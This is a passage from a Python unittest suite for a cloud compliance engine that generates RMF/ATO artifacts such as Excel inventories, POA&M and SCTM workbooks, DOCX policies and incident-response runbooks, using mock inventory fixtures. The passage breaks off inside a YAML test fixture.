#!/usr/bin/env python3
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Comprehensive Automated Regression Test Suite for Compliance & RMF Engine.

================================================================================
INTERNAL DEVELOPER TEST SUITE ONLY
================================================================================
This test suite is exclusively for developers modifying the internal Python source
code of the compliance engine scripts (.gemini/skills/compliance/scripts/).

IT MUST NOT BE RUN DURING REGULAR COMPLIANCE SKILL EXECUTION OR WORKSPACE
PROVISIONING. When running the compliance skill for a target workspace, only
execute the 3 operational workflow scripts:
  1. extract_system_data.py <TARGET_FOLDER>
  2. generate_compliance_artifacts.py <TARGET_FOLDER>
  3. validate_compliance_artifacts.py <TARGET_FOLDER> --fix
================================================================================

This test suite validates all compliance engine subsystems:
1. Excel Template Hydration (HWSW, POAM, PPSM, SCTM)
2. Pure-Python DOCX Generation (AST parsing, tables, callout boxes, hyperlinks)
3. Dual-Format Master Generator Orchestration (Markdown, DOCX, YAML, Excel)
4. Package Validation & OpenXML Inspector
5. Application-tier discovery and multi-cloud extraction
6. Security scanner bridge and SARIF ingestion
7. Formula injection prevention and HCL parsing hardening
"""

import copy
from datetime import datetime
import json
import logging
import os
from pathlib import Path
import shutil
import sys
import tempfile
from typing import Any, Dict, Optional, Union
import unicodedata
import unittest
import unittest.mock
import urllib.error
import urllib.request
import zipfile

SCRIPT_DIR: str = os.path.dirname(os.path.abspath(__file__))
SKILL_BASE: str = os.path.abspath(os.path.join(SCRIPT_DIR, ".."))
SRC_DIR: str = os.path.join(SKILL_BASE, "src")
TEMPLATES_DIR: str = os.path.join(SKILL_BASE, "templates")

for _p in (SRC_DIR, SCRIPT_DIR):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import compliance_engine
for _mod in (
    "audit_log", "docx_generator", "excel_hydrator", "export_strategies",
    "extract_system_data", "file_helpers", "generate_compliance_artifacts",
    "hcl_parser", "oscal_generator", "poam_rules", "runbook_hydration",
    "safe_xml", "security_scanner_bridge", "service_catalog", "stig_resolver",
    "template_engine", "utils", "validate_compliance_artifacts",
):
    if hasattr(compliance_engine, _mod):
        sys.modules[_mod] = getattr(compliance_engine, _mod)

from file_helpers import _bootstrap_environment
_bootstrap_environment()

try:
    import defusedxml.ElementTree as ET
except ImportError:
    try:
        from compliance_engine import safe_xml as ET
    except ImportError:
        import xml.etree.ElementTree as ET

import openpyxl

import docx_generator
import excel_hydrator
import export_strategies
import extract_system_data
import file_helpers
import generate_compliance_artifacts
import oscal_generator
import poam_rules
import security_scanner_bridge
import service_catalog
import utils
import validate_compliance_artifacts
import stig_resolver

os.environ.setdefault("COMPLIANCE_DISABLE_LIVE_SCANNERS", "1")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger(__name__)


class TestComplianceEngine(unittest.TestCase):
    """Test suite validating end-to-end functionality of the compliance engine."""

    def setUp(self) -> None:
        """Initializes test fixtures, temporary workspace, and mock inventory.

        Args:
            None.

        Returns:
            None.
        """
        self.test_dir: str = tempfile.mkdtemp(prefix="compliance_test_")
        self.addCleanup(shutil.rmtree, self.test_dir, ignore_errors=True)
        self.mock_inventory: Dict[str, Any] = {
            "system_information": {
                "system_name": "Enterprise Secure Cloud Foundation",
                "system_abbreviation": "SCF",
                "organization": "Enterprise Public Sector Agency",
                "impact_level": "IL5",
                "compliance_baseline": "NIST SP 800-53 Rev. 5 / DoD IL5",
                "effective_date": "2026-08-28",
                "primary_location": "[CONFIG_REQUIRED: Primary Location]",
                "version": "1.0.0"
            },
            "personnel_roles": {
                "authorizing_official": {
                    "name": "Alex Taylor",
                    "title": "Authorizing Official",
                    "organization": "Agency Executive Leadership",
                    "email": "ao@example.gov",
                    "phone": "555-0100"
                },
                "system_owner": {
                    "name": "Jordan Smith",
                    "title": "Information System Owner",
                    "organization": "Platform Directorate",
                    "email": "so@example.gov",
                    "phone": "555-0101"
                },
                "issm": {
                    "name": "Morgan Johnson",
                    "title": "ISSM",
                    "organization": "Information Security Office",
                    "email": "issm@example.gov",
                    "phone": "555-0102"
                },
                "isso": {
                    "name": "Riley Davis",
                    "title": "ISSO",
                    "organization": "Information Security Office",
                    "email": "isso@example.gov",
                    "phone": "555-0103"
                }
            },
            "network_architecture": {
                "vpcs": ["vpc-hub-prod", "vpc-spoke-app"],
                "subnets_cidrs": ["10.100.0.0/16", "10.200.1.0/24"],
                "firewall_rules": [
                    {"name": "allow-https-ingress", "direction": "INGRESS", "protocol": "TCP", "ports": "443", "action": "ALLOW"},
                    {"name": "allow-iap-ssh", "direction": "INGRESS", "protocol": "TCP", "ports": "22", "action": "ALLOW"}
                ]
            },
            "infrastructure_components": {
                "services_enabled": [
                    "compute.googleapis.com",
                    "container.googleapis.com",
                    "cloudkms.googleapis.com",
                    "storage.googleapis.com",
                    "sqladmin.googleapis.com",
                    "logging.googleapis.com"
                ],
                "storage_buckets": [{"name": "mock-compliance-bucket", "location": "us-central1"}],
                "gke_clusters": [{"name": "prod-gke-cluster-0"}],
                "databases": [{"type": "Cloud SQL PostgreSQL 15", "name": "prod-db-postgres-0"}],
                "kms_keys": [{"name": "projects/kms-p/locations/us/keyRings/cmek-kr/cryptoKeys/key-0"}],
                "compute_instances": [{"name": "prod-bastion-vm-0"}],
                "service_accounts": [{"account_id": "sa-app-worker", "file": "terraform/sa.tf"}],
                "modules_used": ["terraform-google-modules/cloud-storage/google"]
            },
            "application_components": {
                "applications": [],
                "software_packages": [],
                "container_images": [],
                "exposed_ports": []
            },
            "export_preferences": {
                "policy_formats": "both",
                "structured_data_formats": "both"
            },
            "security_scanners": {
                "enabled": False,
                "run_checkov": False,
                "run_semgrep": False,
                "ingest_sarif": False
            }
        }

    def tearDown(self) -> None:
        """Cleans up temporary directory after each test.

        Args:
            None.

        Returns:
            None.
        """
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)

    def test_hwsw_excel_hydration(self) -> None:
        """Tests HWSW Excel template hydration and data row creation.

        Args:
            None.

        Returns:
            None.
        """
        tpl_path = os.path.join(TEMPLATES_DIR, "hwsw", "HWSWList_Template.xlsm")
        self.assertTrue(os.path.exists(tpl_path), "HWSW Template must exist")

        out_path = os.path.join(self.test_dir, "Hardware_Software_Inventory.xlsm")
        hydrator = excel_hydrator.HWSWHydrator(tpl_path)
        hydrator.hydrate(self.mock_inventory, out_path)

        self.assertTrue(os.path.exists(out_path), "Output .xlsm file must be created")

        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        self.assertIn("Hardware", workbook.sheetnames)
        self.assertIn("Software", workbook.sheetnames)

        ws_hw = workbook["Hardware"]
        self.assertEqual(ws_hw["C5"].value, "Enterprise Secure Cloud Foundation")
        self.assertGreaterEqual(ws_hw.max_row, 8, "Hardware rows must be populated starting at row 8")

        ws_sw = workbook["Software"]
        self.assertGreaterEqual(ws_sw.max_row, 8, "Software rows must be populated starting at row 8")
        # Validate Software row 8 date logic
        in_srv = ws_sw.cell(row=8, column=12).value
        self.assertIsNotNone(in_srv)
        in_srv_d = datetime.strptime(str(in_srv)[:10], "%Y-%m-%d").date()
        self.assertLessEqual(in_srv_d, datetime.now().date(), "In-service date must be today or in the past")
        renewal_d_str = ws_sw.cell(row=8, column=23).value
        if renewal_d_str and renewal_d_str not in ["N/A", "Perpetual"]:
            ren_d = datetime.strptime(str(renewal_d_str)[:10], "%Y-%m-%d").date()
            self.assertGreater(ren_d, datetime.now().date(), "License renewal date must be in the future")

    def test_poam_excel_hydration(self) -> None:
        """Tests POA&M Excel template hydration and metadata injection.

        Args:
            None.

        Returns:
            None.
        """
        tpl_path = os.path.join(TEMPLATES_DIR, "poam", "POAM_Export_Template.xlsm")
        self.assertTrue(os.path.exists(tpl_path), "POAM Template must exist")

        out_path = os.path.join(self.test_dir, "Plan_of_Action_and_Milestones.xlsm")
        hydrator = excel_hydrator.POAMHydrator(tpl_path)
        hydrator.hydrate(self.mock_inventory, out_path)

        self.assertTrue(os.path.exists(out_path))
        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        self.assertIn("POA&M", workbook.sheetnames)
        ws_poam = workbook["POA&M"]
        self.assertEqual(ws_poam["D5"].value, "Enterprise Secure Cloud Foundation")
        self.assertGreaterEqual(ws_poam.max_row, 8)

        # Validate POA&M row 8 scheduled completion date is in the future for ongoing items
        poam_status = ws_poam.cell(row=8, column=6).value
        sched_date = ws_poam.cell(row=8, column=7).value
        if poam_status == "Ongoing" and sched_date:
            sched_d = datetime.strptime(str(sched_date)[:10], "%Y-%m-%d").date()
            self.assertGreater(sched_d, datetime.now().date(), "Ongoing POA&M scheduled completion date must be in the future")

    def test_ppsm_excel_hydration(self) -> None:
        """Tests PPSM Excel template hydration and boundary data rows.

        Args:
            None.

        Returns:
            None.
        """
        tpl_path = os.path.join(TEMPLATES_DIR, "ppsm", "PPSMBoundariesInformationExport_Template.xlsm")
        self.assertTrue(os.path.exists(tpl_path), "PPSM Template must exist")

        out_path = os.path.join(self.test_dir, "PPSM_Ports_Protocols_Services.xlsm")
        hydrator = excel_hydrator.PPSMHydrator(tpl_path)
        hydrator.hydrate(self.mock_inventory, out_path)

        self.assertTrue(os.path.exists(out_path))
        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        self.assertIn("PPSM", workbook.sheetnames)
        ws_ppsm = workbook["PPSM"]
        self.assertEqual(ws_ppsm["C5"].value, "Enterprise Secure Cloud Foundation")
        self.assertGreaterEqual(ws_ppsm.max_row, 9)

    def test_sctm_excel_hydration(self) -> None:
        """Tests SCTM in-place control row matching and burndown status.

        Args:
            None.

        Returns:
            None.
        """
        tpl_path = os.path.join(TEMPLATES_DIR, "sctm", "ControlInfoExport_Template.xlsm")
        self.assertTrue(os.path.exists(tpl_path), "SCTM Template must exist")

        out_path = os.path.join(self.test_dir, "SCTM_Burndown_Matrix.xlsm")
        hydrator = excel_hydrator.SCTMHydrator(tpl_path)
        hydrator.hydrate(self.mock_inventory, out_path)

        self.assertTrue(os.path.exists(out_path))
        workbook = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        self.assertIn("Template", workbook.sheetnames)
        ws_template = workbook["Template"]
        status_val = ws_template.cell(row=7, column=5).value
        self.assertIsNotNone(status_val)
        self.assertIn(status_val, ["Implemented", "Inherited", "Hybrid", "Compensated", "Planned"])

        est_date = ws_template.cell(row=7, column=10).value
        self.assertIsNotNone(est_date)
        # eMASS format MM/DD/YYYY
        self.assertRegex(str(est_date), r"^\d{2}/\d{2}/\d{4}$")
        d7_parsed = datetime.strptime(str(est_date), "%m/%d/%Y").date()
        if status_val == "Planned":
            self.assertGreater(d7_parsed, datetime.now().date(), "Planned control estimated completion date must be in the future")
        else:
            self.assertLessEqual(d7_parsed, datetime.now().date(), "Implemented/Inherited control completion date must be today or in the past")

        # Check row 8 (AC-02 Implemented control)
        row8_status = ws_template.cell(row=8, column=5).value
        row8_date = ws_template.cell(row=8, column=10).value
        self.assertEqual(row8_status, "Implemented")
        self.assertIsNotNone(row8_date)
        d8_parsed = datetime.strptime(str(row8_date), "%m/%d/%Y").date()
        self.assertLessEqual(d8_parsed, datetime.now().date(), "Implemented control date must be today or in the past")

        resp_entities = ws_template.cell(row=7, column=12).value
        self.assertIsNotNone(resp_entities)
        self.assertTrue(len(str(resp_entities)) > 0)

        slcm_comments = ws_template.cell(row=7, column=19).value
        self.assertIsNotNone(slcm_comments)
        self.assertTrue(len(str(slcm_comments)) > 0)

    def test_docx_policy_generation(self) -> None:
        """Tests pure-Python DOCX generation with tables and callout boxes.

        Args:
            None.

        Returns:
            None.
        """
        sample_md = """# Access Control Policy and Procedures (AC)

This is an executive policy manual.

## 1. Roles and Responsibilities
The following team assignments govern access control:

| Principal Role | Responsibilities | Assigned Team |
| :--- | :--- | :--- |
| ISSM | Approves privileged access | Information Assurance |
| Cloud Admin | Manages IAM bindings | Platform Engineering |

> [!IMPORTANT]
> **RMF TEAM / HUMAN ACTION REQUIRED**: Provide local biometric datacenter SOP.
"""
        out_docx = os.path.join(self.test_dir, "Access_Control_Policy.docx")
        docx_generator.convert_markdown_to_docx(sample_md, out_docx, self.mock_inventory)

        self.assertTrue(os.path.exists(out_docx))

        with zipfile.ZipFile(out_docx, "r") as zip_archive:
            namelist = zip_archive.namelist()
            self.assertIn("[Content_Types].xml", namelist)
            self.assertIn("word/document.xml", namelist)
            self.assertIn("word/styles.xml", namelist)
            doc_xml = zip_archive.read("word/document.xml")
            root = ET.fromstring(doc_xml)
            tables = root.findall(".//{http://schemas.openxmlformats.org/wordprocessingml/2006/main}tbl")
            self.assertGreaterEqual(len(tables), 2, "Must contain cover table and markdown table")

    def test_docx_hyperlink_generation_and_validation(self) -> None:
        """Tests OpenXML hyperlink rendering, relationship registration, and audit validation.

        Verifies that:
        1. Markdown links [text](url) generate <w:hyperlink> nodes with valid r:id attributes.
        2. Bare URLs in prose (https://...) generate <w:hyperlink> nodes with trimmed punctuation.
        3. word/_rels/document.xml.rels maps every r:id to an external target.
        4. word/styles.xml contains the Hyperlink character style.
        5. audit_docx_policies validates all relationships without errors.
        """
        sample_md = """# Authorization Roadmap & STIG Reference Guide

This document outlines the accreditation requirements.

## 1. Governance Authorities & Frameworks
Refer to official federal guidance:
- Standard: [NIST SP 800-37 Rev. 2](https://csrc.nist.gov/pubs/sp/800/37/r2/final) for RMF lifecycle.
- Also inspect the DoD SRG portal at https://www.cyber.mil/stigs/downloads.
- Parenthetical reference: (https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final).

| Artifact | Authoritative Reference | Relative Path |
| :--- | :--- | :--- |
| System Security Plan | [NIST SP 800-18](https://csrc.nist.gov/pubs/sp/800/18/r1/final) | [SSP Document](SSP/SSP.docx) |
| Continuous Monitoring | [NIST SP 800-137](https://csrc.nist.gov/pubs/sp/800/137/final) | [ConMon Strategy](Policies_and_Procedures/CA_Assessment_Authorization_Continuous_Monitoring.docx) |

> [!NOTE]
> For online STIG lookup, visit the [STIG Viewer catalog](https://www.stigviewer.com/stigs) directly.
"""
        out_docx = os.path.join(self.test_dir, "Hyperlink_Audit_Test.docx")
        docx_generator.convert_markdown_to_docx(sample_md, out_docx, self.mock_inventory)
        self.assertTrue(os.path.exists(out_docx))

        with zipfile.ZipFile(out_docx, "r") as zip_archive:
            namelist = zip_archive.namelist()
            self.assertIn("word/document.xml", namelist)
            self.assertIn("word/_rels/document.xml.rels", namelist)
            self.assertIn("word/styles.xml", namelist)

            # Check styles.xml contains Hyperlink style
            styles_xml = zip_archive.read("word/styles.xml").decode("utf-8")
            self.assertIn('w:styleId="Hyperlink"', styles_xml)

            # Check document.xml contains w:hyperlink nodes
            doc_xml = zip_archive.read("word/document.xml")
            doc_root = ET.fromstring(doc_xml)
            hyperlinks = doc_root.findall(".//{http://schemas.openxmlformats.org/wordprocessingml/2006/main}hyperlink")
            self.assertGreaterEqual(len(hyperlinks), 7, "Must contain all markdown, bare, table, and callout links")

            # Check document.xml.rels contains relationships for all hyperlinks
            rels_xml = zip_archive.read("word/_rels/document.xml.rels")
            rels_root = ET.fromstring(rels_xml)
            rel_map = {}
            for r in rels_root.findall(".//{http://schemas.openxmlformats.org/package/2006/relationships}Relationship"):
                rel_map[r.attrib.get("Id")] = {
                    "target": r.attrib.get("Target"),
                    "type": r.attrib.get("Type"),
                    "mode": r.attrib.get("TargetMode", ""),
                }

            # Verify every hyperlink references a registered relationship
            for hl in hyperlinks:
                r_id = hl.attrib.get("{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id")
                self.assertIn(r_id, rel_map, f"Hyperlink r:id {r_id} must be registered in document.xml.rels")
                self.assertEqual(rel_map[r_id]["mode"], "External")
                self.assertTrue(bool(rel_map[r_id]["target"]), "Target URL must not be empty")

            # Verify specific target URLs and trailing punctuation trimming
            targets = [r["target"] for r in rel_map.values()]
            self.assertIn("https://csrc.nist.gov/pubs/sp/800/37/r2/final", targets)
            self.assertIn("https://www.cyber.mil/stigs/downloads", targets, "Trailing period must be stripped")
            self.assertIn("https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final", targets, "Trailing parenthesis must be stripped")
            self.assertIn("SSP/SSP.docx", targets, "Relative link must be preserved")
            self.assertIn("https://www.stigviewer.com/stigs", targets)

        # Audit with validate_compliance_artifacts.audit_docx_policies
        audit_results = validate_compliance_artifacts.audit_docx_policies(self.test_dir)
        matching = [r for r in audit_results if r["file"] == "Hyperlink_Audit_Test.docx"]
        self.assertEqual(len(matching), 1)
        self.assertEqual(matching[0]["status"], "PASS")
        self.assertGreaterEqual(matching[0]["hyperlinks_count"], 7)
        self.assertEqual(len(matching[0]["issues"]), 0)

    def test_end_to_end_orchestration_and_validation(self) -> None:
        """Tests full end-to-end generation across Markdown, DOCX, YAML, and Excel.

        Args:
            None.

        Returns:
            None.
        """
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        with open(inv_path, "w", encoding="utf-8") as json_file:
            json.dump(self.mock_inventory, json_file)

        results = generate_compliance_artifacts.generate_ato_artifacts(
            self.test_dir, policy_format="both", data_format="both"
        )

        self.assertEqual(len(results["excel"]), 4, "Must generate 4 Excel workbooks")
        self.assertGreaterEqual(len(results["docx"]), 20, "Must generate 20 Word policy manuals plus SSP/PTA")
        self.assertEqual(len(results["yaml"]), 5, "Must generate 5 structured YAML matrices")
        self.assertGreaterEqual(len(results["markdown"]), 22, "Must generate SSP, PTA, and 20 Markdown policies")

        rb_dir = os.path.join(self.test_dir, "ato_artifacts", "Incident_Response_Runbooks")
        self.assertTrue(os.path.exists(rb_dir), "Incident_Response_Runbooks directory must exist")
        expected_rbs = [
            "IR_IAM_Compromised_Credentials_Runbook",
            "IR_Compute_Resource_Compromise_Runbook",
            "IR_KMS_CMEK_Compromise_Runbook",
            "IR_Network_Intrusion_Runbook",
            "IR_VPC_Service_Controls_Violation_Runbook",
            "Incident_Response_Runbook_Template"
        ]
        for rb_name in expected_rbs:
            self.assertTrue(os.path.exists(os.path.join(rb_dir, f"{rb_name}.md")), f"{rb_name}.md must exist")
            self.assertTrue(os.path.exists(os.path.join(rb_dir, f"{rb_name}.docx")), f"{rb_name}.docx must exist")

        val_success = validate_compliance_artifacts.validate_compliance_package(self.test_dir)
        self.assertTrue(val_success, "Package validation must succeed")

        report_path = os.path.join(self.test_dir, "ato_artifacts", "Path_to_Authorization.md")
        docx_path = os.path.join(self.test_dir, "ato_artifacts", "Path_to_Authorization.docx")
        self.assertTrue(os.path.exists(report_path), "Path_to_Authorization.md must be generated at root of ato_artifacts")
        self.assertTrue(os.path.exists(docx_path), "Path_to_Authorization.docx must be generated at root of ato_artifacts")

    def test_issm_and_stig_validation_reporting(self) -> None:
        """Tests that Path_to_Authorization.md includes ISSM roadmap, ATC controls, and STIG Viewer links.

        Args:
            None.

        Returns:
            None.
        """
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        with open(inv_path, "w", encoding="utf-8") as json_file:
            json.dump(self.mock_inventory, json_file)

        generate_compliance_artifacts.generate_ato_artifacts(
            self.test_dir, policy_format="markdown", data_format="yaml"
        )
        validate_compliance_artifacts.validate_compliance_package(self.test_dir)

        report_path = os.path.join(self.test_dir, "ato_artifacts", "Path_to_Authorization.md")
        self.assertTrue(os.path.exists(report_path))

        with open(report_path, "r", encoding="utf-8") as report_file:
            report_content = report_file.read()

        self.assertIn("Master ATO Journey & Complete Accreditation Itinerary", report_content)
        self.assertIn("Phase 1: Program Initiation, Stakeholders & Account Provisioning", report_content)
        self.assertIn("Phase 3: Automated ATO Foundation Generation", report_content)
        self.assertIn("Phase 4: Security Assessments, Vulnerability Scans & STIG Benchmarks", report_content)
        self.assertIn("ACAS / Nessus Credentialed Scans", report_content)

        self.assertIn("14 ATC (Authorization to Connect) Critical Controls Verification", report_content)
        self.assertIn("AC-17", report_content)
        self.assertIn("SC-28", report_content)
        self.assertIn("SI-2", report_content)

        self.assertIn("Mandatory DISA STIG & SRG Checklist Compliance Roadmap", report_content)
        self.assertIn("https://public.cyber.mil/stigs/downloads/", report_content)
        self.assertIn("requires CAC authentication", report_content)
        self.assertIn("DISA STIG Viewer desktop application", report_content)
        self.assertIn("https://www.stigviewer.com/stigs", report_content)
        self.assertIn("cloud_computing_srg", report_content)

        self.assertIn("NIST SP 800-37 Rev. 2 RMF 7-Step Crosswalk", report_content)
        self.assertIn("Mandiant Penetration Test Hardening Safeguards", report_content)
        self.assertIn("Military Service Branch & Federal Agency Governance Overlays", report_content)
        self.assertIn("Department of the Navy (DON / USN)", report_content)
        self.assertIn("Department of the Army (USA)", report_content)

    def test_incident_response_runbooks_and_scc_il4_accuracy(self) -> None:
        """Tests that IR runbooks and outputs accurately reflect threat detection tooling and CSSP routing.

        Args:
            None.

        Returns:
            None.
        """
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        with open(inv_path, "w", encoding="utf-8") as json_file:
            json.dump(self.mock_inventory, json_file)

        generate_compliance_artifacts.generate_ato_artifacts(
            self.test_dir, policy_format="markdown", data_format="yaml"
        )
        validate_compliance_artifacts.validate_compliance_package(self.test_dir)

        rb_path = os.path.join(self.test_dir, "ato_artifacts", "Incident_Response_Runbooks", "IR_IAM_Compromised_Credentials_Runbook.md")
        self.assertTrue(os.path.exists(rb_path))
        with open(rb_path, "r", encoding="utf-8") as rb_file:
            rb_content = rb_file.read()

        self.assertIn("Enterprise Secure Cloud Foundation", rb_content)
        self.assertIn("Enterprise Public Sector Agency", rb_content)

        self.assertIn("Cloud-Native Posture & Threat Detection", rb_content)
        self.assertIn("Centralized SIEM / CSSP Integration", rb_content)

        report_path = os.path.join(self.test_dir, "ato_artifacts", "Path_to_Authorization.md")
        with open(report_path, "r", encoding="utf-8") as report_file:
            pta_content = report_file.read()
        self.assertIn("Enable cloud-native threat detection (Security Command Center / Google Cloud SecOps) where configured", pta_content)

    def test_service_catalog_resolution(self) -> None:
        """Tests declarative YAML catalog lookups, custom service overrides, and dynamic heuristics.

        Args:
            None.

        Returns:
            None.
        """
        from service_catalog import resolve_gcp_service

        category, display_name, purpose = resolve_gcp_service("cloudkms.googleapis.com")
        self.assertEqual(category, "Key Management & HSM")
        self.assertEqual(display_name, "Google Cloud KMS")
        self.assertIn("FIPS 140-3 CMEK", purpose)

        custom = {
            "paloaltonetworks.com": {
                "category": "Next-Generation Firewall",
                "display_name": "Palo Alto VM-Series",
                "purpose": "Perimeter IPS/IDS filtering"
            }
        }
        category, display_name, purpose = resolve_gcp_service("paloaltonetworks.com", custom_services=custom)
        self.assertEqual(category, "Next-Generation Firewall")
        self.assertEqual(display_name, "Palo Alto VM-Series")

        category, display_name, purpose = resolve_gcp_service("future-vertex-ai.googleapis.com")
        self.assertEqual(category, "AI & Machine Learning")

    def test_application_discovery_and_hydration(self) -> None:
        """Tests that extract_system_data discovers application-tier codebases and hydrates them.

        Args:
            None.

        Returns:
            None.
        """
        app_test_dir = tempfile.mkdtemp(prefix="app_compliance_test_")
        self.addCleanup(shutil.rmtree, app_test_dir, ignore_errors=True)
        try:
            node_dir = os.path.join(app_test_dir, "web-frontend")
            os.makedirs(node_dir, exist_ok=True)
            with open(os.path.join(node_dir, "package.json"), "w", encoding="utf-8") as pkg_file:
                json.dump({
                    "name": "enterprise-portal-frontend",
                    "version": "2.4.0",
                    "description": "Enterprise Mission Portal Frontend",
                    "main": "server.js",
                    "dependencies": {
                        "express": "^4.18.2",
                        "react": "^18.2.0",
                        "@google-cloud/storage": "^7.0.0",
                        "pg": "^8.11.0"
                    }
                }, pkg_file)
            with open(os.path.join(node_dir, "server.js"), "w", encoding="utf-8") as js_file:
                js_file.write('const express = require("express");\nconst app = express();\napp.listen(3000, () => {});\n')

            py_dir = os.path.join(app_test_dir, "api-backend")
            os.makedirs(py_dir, exist_ok=True)
            with open(os.path.join(py_dir, "requirements.txt"), "w", encoding="utf-8") as req_file:
                req_file.write("fastapi==0.104.1\nuvicorn==0.24.0\nsqlalchemy==2.0.23\npsycopg2-binary==2.9.9\n")
            with open(os.path.join(py_dir, "app.py"), "w", encoding="utf-8") as py_file:
                py_file.write('import uvicorn\nPORT = 8000\n')

            docker_dir = os.path.join(app_test_dir, "containers")
            os.makedirs(docker_dir, exist_ok=True)
            with open(os.path.join(docker_dir, "Dockerfile"), "w", encoding="utf-8") as docker_file:
                docker_file.write('FROM node:18-alpine\nWORKDIR /app\nEXPOSE 8080\nCMD ["node", "server.js"]\n')
            with open(os.path.join(docker_dir, "docker-compose.yml"), "w", encoding="utf-8") as compose_file:
                compose_file.write('version: "3.8"\nservices:\n  db:\n    image: postgres:15-alpine\n    ports:\n      - "5432:5432"\n')

            go_dir = os.path.join(app_test_dir, "data-processor")
            os.makedirs(go_dir, exist_ok=True)
            with open(os.path.join(go_dir, "go.mod"), "w", encoding="utf-8") as mod_file:
                mod_file.write("module github.com/defense/telemetry-processor\n\ngo 1.21\n\nrequire github.com/gin-gonic/gin v1.9.1\n")

            inv = extract_system_data.extract_system_inventory(app_test_dir)
            self.assertIn("application_components", inv)
            app_comp = inv["application_components"]

            app_names = [a["name"] for a in app_comp["applications"]]
            self.assertIn("enterprise-portal-frontend", app_names)
            self.assertIn("telemetry-processor", app_names)

            pkg_names = [p["name"] for p in app_comp["software_packages"]]
            self.assertIn("express", pkg_names)
            self.assertIn("react", pkg_names)
            self.assertIn("fastapi", pkg_names)
            self.assertIn("node:18-alpine", pkg_names)

            ports = [p["port"] for p in app_comp["exposed_ports"]]
            self.assertIn("3000", ports)
            self.assertIn("8080", ports)
            self.assertIn("5432", ports)

            min_tpl_dir = Path(app_test_dir) / "min_templates"
            (min_tpl_dir / "policies").mkdir(parents=True, exist_ok=True)
            shutil.copy(
                os.path.join(TEMPLATES_DIR, "policies", "Access_Control_Policy_and_Procedures.md"),
                min_tpl_dir / "policies" / "Access_Control_Policy_and_Procedures.md",
            )

            def mock_hydrate_app(target_dir, inv):
                out_d = Path(target_dir) / "ato_artifacts"
                tpl_d = file_helpers.get_templates_dir()
                res = {}
                hw_out = out_d / "HW_SW_Inventory" / "Hardware_Software_Inventory.xlsm"
                hw_out.parent.mkdir(parents=True, exist_ok=True)
                res["hwsw"] = excel_hydrator.HWSWHydrator(str(tpl_d / "hwsw" / "HWSWList_Template.xlsm")).hydrate(inv, str(hw_out))
                ppsm_out = out_d / "PPSM" / "PPSM_Ports_Protocols_Services.xlsm"
                ppsm_out.parent.mkdir(parents=True, exist_ok=True)
                res["ppsm"] = excel_hydrator.PPSMHydrator(str(tpl_d / "ppsm" / "PPSMBoundariesInformationExport_Template.xlsm")).hydrate(inv, str(ppsm_out))
                return res

            with unittest.mock.patch("generate_compliance_artifacts.TEMPLATES_DIR", str(min_tpl_dir)):
                with unittest.mock.patch("excel_hydrator.hydrate_all_excel_templates", side_effect=mock_hydrate_app):
                    generate_compliance_artifacts.generate_ato_artifacts(app_test_dir, policy_format="markdown", data_format="both")

                hwsw_path = os.path.join(app_test_dir, "ato_artifacts", "HW_SW_Inventory", "Hardware_Software_Inventory.yaml")
                self.assertTrue(os.path.exists(hwsw_path))
                with open(hwsw_path, "r", encoding="utf-8") as hwsw_file:
                    hwsw_content = hwsw_file.read()
                self.assertIn("enterprise-portal-frontend", hwsw_content)
                self.assertIn("node:18-alpine", hwsw_content)
                self.assertIn("fastapi", hwsw_content)

                ppsm_path = os.path.join(app_test_dir, "ato_artifacts", "PPSM", "PPSM_Ports_Protocols_Services.yaml")
                self.assertTrue(os.path.exists(ppsm_path))
                with open(ppsm_path, "r", encoding="utf-8") as ppsm_file:
                    ppsm_content = ppsm_file.read()
                self.assertIn("3000", ppsm_content)
                self.assertIn("8080", ppsm_content)

                hwsw_xl = os.path.join(app_test_dir, "ato_artifacts", "HW_SW_Inventory", "Hardware_Software_Inventory.xlsm")
                ppsm_xl = os.path.join(app_test_dir, "ato_artifacts", "PPSM", "PPSM_Ports_Protocols_Services.xlsm")
                self.assertTrue(os.path.exists(hwsw_xl))
                self.assertTrue(os.path.exists(ppsm_xl))

                val_success = validate_compliance_artifacts.validate_compliance_package(
                    app_test_dir, policy_format="markdown", data_format="both"
                )
                self.assertTrue(val_success)

        finally:
            shutil.rmtree(app_test_dir, ignore_errors=True)

    def test_truth_first_hcl_and_foundation_configs_extraction(self) -> None:
        """Verifies truth-first extraction from HCL modules and foundation configs.

        Args:
            None.

        Returns:
            None.
        """
        truth_test_dir = tempfile.mkdtemp(prefix="truth_compliance_test_")
        self.addCleanup(shutil.rmtree, truth_test_dir, ignore_errors=True)
        try:
            fc_shared = os.path.join(truth_test_dir, "foundation_configs", "shared")
            fc_fw = os.path.join(truth_test_dir, "foundation_configs", "firewall")
            tf_dir = os.path.join(truth_test_dir, "terraform")
            os.makedirs(fc_shared, exist_ok=True)
            os.makedirs(fc_fw, exist_ok=True)
            os.makedirs(tf_dir, exist_ok=True)

            fv_content = """
organization: "DoD Mission Systems Agency"
system_name: "Stellar Engine Mission Cloud"
system_abbreviation: "AMC"
billing_account: "01ABCD-2345EF-678901"
default_region: "us-east4"
impact_level: "IL5"
compliance_baseline: "DoD IL5 / NIST SP 800-53 Rev. 5"

iam:
  google_groups:
    gcp_security_admins: "sec-admins@mil.example.com"
    gcp_network_admins: "net-admins@mil.example.com"

contracts:
  agreement_name: "DoD Enterprise Cloud Master Agreement #98765"
  contract_number: "DOD-FED-2026-09"
  contract_year: "2026"
  expiration_date: "2031-12-31"
"""
